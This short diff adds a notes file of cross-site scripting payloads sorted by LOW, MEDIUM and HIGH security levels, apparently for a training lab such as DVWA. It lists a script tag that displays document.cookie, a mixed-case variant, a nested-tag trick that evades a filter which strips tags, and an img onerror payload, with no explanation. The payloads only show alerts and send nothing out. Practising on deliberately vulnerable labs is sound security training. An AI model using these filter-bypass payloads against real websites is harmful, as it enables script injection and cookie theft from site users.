@@ -1,0 +1,14 @@
+LOW :
+
+<script>alert(document.cookie)</script>
+
+MEDIUM : 
+
+<SCRIPT>alert(document.cookie)</script>
+or 
+<scr<script>ipt>alert(document.cookie)</script> --> <script>alert(document.cookie)</script>
+
+HIGH : 
+
+<img src/onerror=alert(1)>
+
